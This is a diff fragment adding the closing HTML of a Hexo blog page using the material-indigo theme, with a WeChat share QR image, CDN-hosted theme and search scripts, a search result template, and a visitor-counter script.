+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsElEQVR42u3ay27DQAgF0Pz/T7dSV60qOxcYklY6s4rysDmz8BDg8YjXx9f6/vr7+v3Nq/cnd0mu0Fx4eHh4rdDvL3f1Th7i1a96nyYx4+Hh4W3zkkDvN2V+8FR59zHj4eHh/QVe4XHcAiT5MB4eHt5/5CXv5GHdbxAeHh7eX+blYSVl3I1y8HqtBQ8PD6+f/UZhvff1en8PDw8Pr9VVrz58q2WFPI1uRoiHh4e3wJuky/OxgFPjC0/ugoeHh7fGS/7q59tRDaUXelSAwMPDwzvKS25ZPULybcqT8uqAAh4eHt42r9eknzeleqMGhSvg4eHhrfHyS0+a9BN2LwXHw8PD2+DlJYnqIZHXBHpl3/L38fDw8A7xqn/yJy2u/NHfKxxHtRY8PDy8MS8PZV6YqB5IvST7UV14eHh4RV6S2k5CmSTu1fbbkyo1Hh4e3iFecrkkhd1oelXBzX8DeHh4eANe/lhP0tlTafSBMQU8PDy8o7y8KZXfrHoY9K4cFSzw8PDwXs6bD0X1mmfV1PzyAMPDw8Nb4M0PgMlAVXWEq1cuwcPDw9vmJUEnRdhq6SEfxmoWdvHw8PBe3jPq3b76oE9S6nwkCw8PD2+PVy0WTNLxXn8/H1xYDA4PDw+vmP7mSXZ1uGp+tFz+Cg8PD2+B18u7q0HnR0W1/FGuteDh4eGNeb1ybXVcoDfONWnF/ZiMwMPDwzvKm4wx9dLx3jY9gvXkm3h4eHiHeB/FlY9V5SWD6oYWroaHh4e3wMtX78Cots3mZQ48PDy81/Dyw6D6CK5eJy9eFGLDw8PDW+P1BqF6+I0TrDB6hYeHh/cmXl5+rW5T72i5bIDh4eHhvZU3Z+fJcV5EfnIg4eHh4a3xJsWIfOzgfjSqGkOyZXh4eHgbvGoDbI6fBNrD4+Hh4R3ifQJ2PmnOc3Gx6wAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
